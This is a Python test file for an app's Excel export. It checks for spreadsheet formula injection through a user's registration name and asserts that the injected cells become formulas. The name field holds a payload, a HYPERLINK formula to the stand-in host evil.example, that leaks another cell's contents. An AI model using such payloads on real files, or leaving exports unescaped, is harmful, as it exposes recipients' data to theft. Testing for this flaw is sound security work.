import io
from openpyxl import load_workbook
from app import export
from app import services as svc
from tests.test_features import shift, report, TODAY, THU

def test_formula_from_registration_name(conn, make_user):
    # what recruiting.submit stores for full_name 'Петров") =HYPERLINK("https://evil.example/?"&C2,"Иван'
    full = 'Петров") =HYPERLINK("https://evil.example/?"&C2,"Иван'
    parts = full.split(); last, first = parts[0], " ".join(parts[1:])
    u = make_user(first, last)
    s = shift(conn, u)
    report(conn, u, s, 20)
    wb = load_workbook(io.BytesIO(export.build_xlsx(conn, TODAY, THU)))
    cell = wb["Итоги"]["A2"]
    print("A2:", cell.data_type, cell.value)
    assert cell.data_type == "f"
    assert wb["Смены"]["B2"].data_type == "f"
